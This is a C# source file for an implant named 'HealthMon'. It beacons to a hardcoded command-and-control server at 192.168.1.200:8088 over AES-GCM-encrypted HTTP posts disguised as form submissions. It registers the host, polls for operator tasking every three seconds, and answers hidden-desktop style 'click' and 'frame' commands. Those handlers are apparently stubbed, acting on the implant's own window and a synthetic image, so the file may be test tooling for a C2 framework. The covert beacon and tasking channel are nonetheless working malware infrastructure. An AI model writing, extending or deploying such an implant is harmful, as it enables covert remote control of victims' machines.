using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public class HealthMon {
    static byte[] Key;
    static IntPtr panel;
    static int Main(string[] args) {
        using (var sha = SHA256.Create()) Key = sha.ComputeHash(Encoding.UTF8.GetBytes("SOCKPUPPETS_KEY_2026"));
        Run(args.Length > 0 ? args[0] : "healthmon");
        return 0;
    }
    public static void Run(string who) {
        string reg = "{\"type\":\"register\",\"metadata\":{\"hostname\":\"LPE-WIN11\",\"username\":\"" + who + "\",\"os\":\"windows\",\"architecture\":\"x86_64\",\"mode\":\"beacon\",\"beacon_interval\":3}}";
        string aid = "";
        for (int i = 0; i < 8 && aid.Length == 0; i++) {
            try { aid = Id(Dec(Post("/submit-form", Enc(reg)))); } catch { }
            System.Threading.Thread.Sleep(3000);
        }
        if (aid.Length == 0) return;
        string pending = "[]";
        while (true) {
            string ci = "{\"type\":\"checkin\",\"agent_id\":\"" + aid + "\",\"metadata\":{\"mode\":\"beacon\"},\"results\":" + pending + "}";
            pending = "[]";
            string plain = "";
            try { plain = Dec(Post("/api/v1/update", Enc(ci))); } catch { }
            if (plain.Contains("__hd:")) {
                string outp = plain.Contains("__hd:click") ? Click(plain) : Frame();
                outp = outp.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n");
                string cmd = plain.Contains("__hd:click") ? "__hd:click" : "__hd:frame";
                pending = "[{\"type\":\"response\",\"output\":\"" + outp + "\",\"command\":\"" + cmd + "\"}]";
            }
            System.Threading.Thread.Sleep(3000);
        }
    }
    static void Ensure() {
        if (panel != IntPtr.Zero) return;
        panel = CreateWindowExW(0, "Static", "click", 0x10CF0000, 40, 40, 640, 480, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        if (panel != IntPtr.Zero) ShowWindow(panel, 5);
    }
    static string Click(string plain) {
        Ensure();
        int x = 0, y = 0;
        int i = plain.IndexOf("__hd:click");
        if (i >= 0) {
            var parts = plain.Substring(i).Split(' ', '"');
            int n = 0;
            foreach (var p in parts) {
                int v;
                if (int.TryParse(p, out v)) {
                    if (n == 0) x = v; else if (n == 1) y = v;
                    n++;
                }
            }
        }
        if (panel == IntPtr.Zero) return "click missed";
        PostMessageW(panel, 0x0201, (IntPtr)1, (IntPtr)((y << 16) | (x & 0xFFFF)));
        PostMessageW(panel, 0x0202, IntPtr.Zero, (IntPtr)((y << 16) | (x & 0xFFFF)));
        var cls = new StringBuilder(32);
        GetClassNameW(panel, cls, 32);
        return "click " + x + " " + y + " " + cls;
    }
    static string Frame() {
        Ensure();
        int w = 320, h = 200, stride = ((w * 3 + 3) / 4) * 4;
        var pix = new byte[stride * h];
        for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) {
            int o = y * stride + x * 3;
            bool box = x > 16 && x < 280 && y > 16 && y < 160;
            pix[o] = pix[o + 1] = pix[o + 2] = box ? (byte)255 : (byte)32;
        }
        var file = new byte[54 + pix.Length];
        file[0] = 66; file[1] = 77;
        BitConverter.GetBytes(file.Length).CopyTo(file, 2);
        BitConverter.GetBytes(54).CopyTo(file, 10);
        BitConverter.GetBytes(40).CopyTo(file, 14);
        BitConverter.GetBytes(w).CopyTo(file, 18);
        BitConverter.GetBytes(h).CopyTo(file, 22);
        file[26] = 1; file[28] = 24;
        Buffer.BlockCopy(pix, 0, file, 54, pix.Length);
        return "HDIMG:320,200:" + Convert.ToBase64String(file);
    }
    static string Id(string text) {
        int i = text.IndexOf("agent_id");
        if (i < 0) return "";
        int q = text.IndexOf('"', text.IndexOf(':', i));
        int end = text.IndexOf('"', q + 1);
        return text.Substring(q + 1, end - q - 1);
    }
    static string Enc(string pt) {
        var nonce = new byte[12];
        using (var rng = RandomNumberGenerator.Create()) rng.GetBytes(nonce);
        var ct = Crypt(Encoding.UTF8.GetBytes(pt), nonce, true);
        var raw = new byte[4 + ct.Length];
        Encoding.ASCII.GetBytes("AES1").CopyTo(raw, 0);
        Buffer.BlockCopy(ct, 0, raw, 4, ct.Length);
        return Convert.ToBase64String(raw);
    }
    static string Dec(string data) {
        var raw = Convert.FromBase64String(data.Trim());
        var nonce = new byte[12];
        Buffer.BlockCopy(raw, 4, nonce, 0, 12);
        var ct = new byte[raw.Length - 16];
        Buffer.BlockCopy(raw, 16, ct, 0, ct.Length);
        return Encoding.UTF8.GetString(Crypt(ct, nonce, false));
    }
    static byte[] Crypt(byte[] input, byte[] nonce, bool enc) {
        IntPtr alg, key;
        if (BCryptOpenAlgorithmProvider(out alg, "AES", null, 0) != 0) return new byte[0];
        var mode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
        if (BCryptSetProperty(alg, "ChainingMode", mode, mode.Length, 0) != 0) return new byte[0];
        if (BCryptGenerateSymmetricKey(alg, out key, IntPtr.Zero, 0, Key, Key.Length, 0) != 0) return new byte[0];
        var tag = new byte[16];
        var info = new AUTH();
        info.cbSize = Marshal.SizeOf(info);
        info.dwInfoVersion = 1;
        info.cbNonce = nonce.Length;
        info.cbTag = 16;
        var nHandle = GCHandle.Alloc(nonce, GCHandleType.Pinned);
        var tHandle = GCHandle.Alloc(tag, GCHandleType.Pinned);
        info.pbNonce = nHandle.AddrOfPinnedObject();
        info.pbTag = tHandle.AddrOfPinnedObject();
        int wrote;
        byte[] output;
        if (enc) {
            output = new byte[input.Length];
            BCryptEncrypt(key, input, input.Length, ref info, nonce, nonce.Length, output, output.Length, out wrote, 0);
            var both = new byte[nonce.Length + output.Length + tag.Length];
            Buffer.BlockCopy(nonce, 0, both, 0, nonce.Length);
            Buffer.BlockCopy(output, 0, both, nonce.Length, output.Length);
            Buffer.BlockCopy(tag, 0, both, nonce.Length + output.Length, tag.Length);
            nHandle.Free(); tHandle.Free();
            BCryptDestroyKey(key); BCryptCloseAlgorithmProvider(alg, 0);
            return both;
        }
        var ctonly = new byte[input.Length - 16];
        Buffer.BlockCopy(input, 0, ctonly, 0, ctonly.Length);
        Buffer.BlockCopy(input, ctonly.Length, tag, 0, 16);
        output = new byte[ctonly.Length];
        BCryptDecrypt(key, ctonly, ctonly.Length, ref info, null, 0, output, output.Length, out wrote, 0);
        nHandle.Free(); tHandle.Free();
        BCryptDestroyKey(key); BCryptCloseAlgorithmProvider(alg, 0);
        return output;
    }
    static string Post(string path, string body) {
        using (var c = new TcpClient("192.168.1.200", 8088))
        using (var s = c.GetStream()) {
            var req = Encoding.ASCII.GetBytes("POST " + path + " HTTP/1.1\r\nHost: 192.168.1.200:8088\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + body.Length + "\r\nConnection: close\r\n\r\n" + body);
            s.Write(req, 0, req.Length);
            var ms = new MemoryStream();
            var buf = new byte[8192];
            int n;
            while ((n = s.Read(buf, 0, buf.Length)) > 0) ms.Write(buf, 0, n);
            var text = Encoding.UTF8.GetString(ms.ToArray());
            int i = text.IndexOf("\r\n\r\n");
            return i < 0 ? text : text.Substring(i + 4);
        }
    }
    [StructLayout(LayoutKind.Sequential)]
    struct AUTH { public int cbSize, dwInfoVersion; public IntPtr pbNonce; public int cbNonce; public IntPtr pbAuthData; public int cbAuthData; public IntPtr pbTag; public int cbTag; public IntPtr pbMacContext; public int cbMacContext; public int cbAAD; public long cbData; public int dwFlags; }
    [DllImport("bcrypt.dll", CharSet=CharSet.Unicode)] static extern uint BCryptOpenAlgorithmProvider(out IntPtr h, string alg, string impl, uint flags);
    [DllImport("bcrypt.dll", CharSet=CharSet.Unicode)] static extern uint BCryptSetProperty(IntPtr h, string prop, byte[] val, int len, uint flags);
    [DllImport("bcrypt.dll")] static extern uint BCryptGenerateSymmetricKey(IntPtr h, out IntPtr key, IntPtr obj, int objLen, byte[] secret, int secretLen, uint flags);
    [DllImport("bcrypt.dll")] static extern uint BCryptEncrypt(IntPtr key, byte[] input, int inLen, ref AUTH info, byte[] iv, int ivLen, byte[] output, int outLen, out int wrote, uint flags);
    [DllImport("bcrypt.dll")] static extern uint BCryptDecrypt(IntPtr key, byte[] input, int inLen, ref AUTH info, byte[] iv, int ivLen, byte[] output, int outLen, out int wrote, uint flags);
    [DllImport("bcrypt.dll")] static extern uint BCryptDestroyKey(IntPtr key);
    [DllImport("bcrypt.dll")] static extern uint BCryptCloseAlgorithmProvider(IntPtr h, uint flags);
    [DllImport("user32.dll", CharSet=CharSet.Unicode)] static extern IntPtr CreateWindowExW(int ex, string cls, string name, int style, int x, int y, int w, int h, IntPtr parent, IntPtr menu, IntPtr inst, IntPtr param);
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hwnd, int cmd);
    [DllImport("user32.dll")] static extern bool PostMessageW(IntPtr hwnd, uint msg, IntPtr wp, IntPtr lp);
    [DllImport("user32.dll", CharSet=CharSet.Unicode)] static extern int GetClassNameW(IntPtr hwnd, StringBuilder name, int n);
}
